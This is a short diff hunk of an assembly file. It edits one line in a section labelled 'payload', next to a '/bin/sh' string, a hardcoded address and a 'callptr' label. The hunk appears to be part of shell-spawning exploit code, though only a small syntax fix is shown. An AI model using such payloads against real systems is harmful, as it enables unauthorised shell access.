@@ -37,7 +37,7 @@ payload:
 
 file_to_run:
         .ascii  "/bin/sh\0"
-        $0x400519
+        .hex    $0x400519
         .ascii  "\0\0\0\0\0\0\0\0"
 
 callptr:
